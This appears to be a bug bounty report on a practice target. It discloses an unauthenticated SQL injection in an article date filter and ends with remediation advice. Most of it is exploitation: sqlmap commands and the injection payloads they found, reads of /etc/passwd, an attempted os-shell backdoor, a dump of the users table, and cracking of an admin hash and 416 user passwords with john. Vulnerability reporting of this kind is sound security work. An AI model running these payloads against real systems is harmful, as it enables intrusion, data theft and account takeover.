## Description

With **Burp Suite software**, I have analyze all exchanges between client to server.
And an exchange caught my attention, when user filter by date articles.
User can use **from** and **to** for filter articles.

Theses parameters are specified in the URL like this :
https://7e44cf96dade47a5c02259f1876a1c64.bountystarter.com/articles/index/2020-09-30/2020-10-08

Details :

* **2020-09-30** is **from** value,
* **2020-10-08** is **to** value,

---

## Exploitation

### SQLMAP tests
The parameters **from** and **to** are sensibles to **SQL injection**. For determine this, I use **sqlmap**.
The attacker does **not need to be authenticated** to exploit this vulnerability.

For specify User-Agent value in sqlmap, I use **--header** option for example :
````bash
sqlmap -u https://7e44cf96dade47a5c02259f1876a1c64.bountystarter.com/articles/index/2020-09-30/2020-10-08 --headers="User-Agent:-BB-NeoDemoCorp"
````

Sqlmap detect two SQL payload :

 * First **time-based blind** : https://7e44cf96dade47a5c02259f1876a1c64.bountystarter.com:443/articles/index/2020-09-30/2020-10-08' AND (SELECT 4450 FROM (SELECT(SLEEP(5)))xryI) AND 'ghwC'='ghwC

 * Second **UNION query** : https://7e44cf96dade47a5c02259f1876a1c64.bountystarter.com:443/articles/index/2020-09-30/2020-10-08' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162626271,0x756d4557664947516d6e516350537243617249584f574d6741657278707753707a625845584a7172,0x716b766a71),NULL,NULL,NULL,NULL-- -

### Get general informations 

First I want to know user of database :
````bash
sqlmap -u https://7e44cf96dade47a5c02259f1876a1c64.bountystarter.com/articles/index/2020-09-30/2020-10-08 --headers="User-Agent:-BB-NeoDemoCorp" --current-user
````

Return :
````text
neocorp@localhost
````

Second I want to know current database :
````bash
sqlmap -u https://7e44cf96dade47a5c02259f1876a1c64.bountystarter.com/articles/index/2020-09-30/2020-10-08 --headers="User-Agent:-BB-NeoDemoCorp" --current-db
````

Return :
````text
neocorp_0_1
````

Third, I want to know password of **neocorp@localhost** user :
````bash
sqlmap -u https://7e44cf96dade47a5c02259f1876a1c64.bountystarter.com/articles/index/2020-09-30/2020-10-08 --headers="User-Agent:-BB-NeoDemoCorp" --passwords
````

With sqlmap, its possible to directly try to crack hash and sqlmap dcrack password for :
````text
neocorp@localhost	neocorp
root@localhost		NULL
````

In sql, it's possible to get content of remote file with **LOAD_FILE()** function, in sqlmap this function is represented with **--file-read** option.

So I will try to get **/etc/passwd** file from server :
````bash
sqlmap -u https://7e44cf96dade47a5c02259f1876a1c64.bountystarter.com/articles/index/2020-09-30/2020-10-08 --headers="User-Agent:-BB-NeoDemoCorp" --file-read "/etc/passwd"
````

Return :
````text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:1000:1000:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/bin/false
mysql:x:101:101:MySQL Server,,,:/nonexistent:/bin/false
````

Next I will try to get **/etc/shadow** file from server :
````bash
sqlmap -u https://7e44cf96dade47a5c02259f1876a1c64.bountystarter.com/articles/index/2020-09-30/2020-10-08 --headers="User-Agent:-BB-NeoDemoCorp" --file-read "/etc/shadow"
````

Return :
````text
[ERROR] no data retrieved
````

I suppose i don't have necessary rights for read this file...

Next, I will try to upload reverse shell by sql injection and **INTO OUTFILE** SQL function, in sqlmap this feature is realize by **--os-shell** option.
````bash
sqlmap -u https://7e44cf96dade47a5c02259f1876a1c64.bountystarter.com/articles/index/2020-09-30/2020-10-08 --headers="User-Agent:-BB-NeoDemoCorp" --os-shell
````

And I use **PHP** backdoor in **common location**
But this attack does not work maybe this feature is **disabled**...

---

## PoC
In this PoC I will try to get username and hashes of user and try to reverse it.

First I need to know db :
````bash
sqlmap -u https://7e44cf96dade47a5c02259f1876a1c64.bountystarter.com/articles/index/2020-09-30/2020-10-08 --headers="User-Agent:-BB-NeoDemoCorp" --dbs
````

Return :
````text
[*] information_schema
[*] mysql
[*] neocorp_0_1
[*] performance_schema
````

Next, I will use neocorp_0_1 :
````bash
sqlmap -u https://7e44cf96dade47a5c02259f1876a1c64.bountystarter.com/articles/index/2020-09-30/2020-10-08 --headers="User-Agent:-BB-NeoDemoCorp" -D neocorp_0_1 --tables
````

Return :
````
+---------------+
| articles      |
| articles_tags |
| comments      |
| tags          |
| users         |
+---------------+
````

Next, i will try to get name of columns of users table :
````bash
sqlmap -u https://7e44cf96dade47a5c02259f1876a1c64.bountystarter.com/articles/index/2020-09-30/2020-10-08 --headers="User-Agent:-BB-NeoDemoCorp" -D neocorp_0_1 -T users --column
````

Return :
````text
+--------------+--------------+
| Column       | Type         |
+--------------+--------------+
| address      | varchar(255) |
| agent_number | varchar(5)   |
| avatar       | longtext     |
| city         | varchar(50)  |
| created      | datetime     |
| email        | varchar(255) |
| id           | int(11)      |
| locked       | tinyint(1)   |
| modified     | datetime     |
| password     | varchar(255) |
| phone        | varchar(12)  |
| role         | varchar(5)   |
| zipcode      | varchar(8)   |
+--------------+--------------+
````

Ok, next I will try to get value in table :
````bash
sqlmap -u https://7e44cf96dade47a5c02259f1876a1c64.bountystarter.com/articles/index/2020-09-30/2020-10-08 --headers="User-Agent:-BB-NeoDemoCorp" -D neocorp_0_1 -T users -C email,password,role --dump
````

Ok great I have dump data, all of data are in **dump.txt** file, in this file I have identified 1 user who have **admin role**.
This user is **joe@neodemo.corp**, and him hashes is :
````text
joe@neodemo.corp,fba1d537718db7a8d8357a661e425899,admin
````

So I need to know which is algorithm who have produce this hash :
````bash
hash-identifier fba1d537718db7a8d8357a661e425899
````

Return :
````text
MD5
````

Ok MD5 not salted, it's bad, very very bad :D !

I have found him password with https://md5decrypt.net/ website :
````text
fba1d537718db7a8d8357a661e425899 -> Fiat Punto
````

I try to connect with this credentials and greeeat it's work :
![img](./admin.png)

After I try to crack all hashes with **john** and **rockyou** wordlist :
````bash
john --format=raw-md5 hash.txt --wordlist=/usr/share/wordlists/rockyou.text 						# 71 password  cracked
john --format=raw-md5 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --rules=Single			# 281 password cracked
john --format=raw-md5 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --rules=Wordlists		# 281 password cracked
john --format=raw-md5 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --rules=Extra			# 416 password cracked
````

Nice I have crack 416 password of user...
All password is store in **crack.txt** file.

Conclude :

 * I have found admin password and now I have admin privilege in application,
 * I have crack 416 password of users

---

## Risk
A people can inject SQL code and read data in database, and we see with different functions we can :

 * Obtain user and password of database,
 * Read file in server (/etc/passwd), 

---

## Remediation
All input must be serialized, for example with sql query prepare, this method esacape all SQL sequence in user input.
So the **from** and **to** parameter and all parameter must be use **prepare sql** statement in application.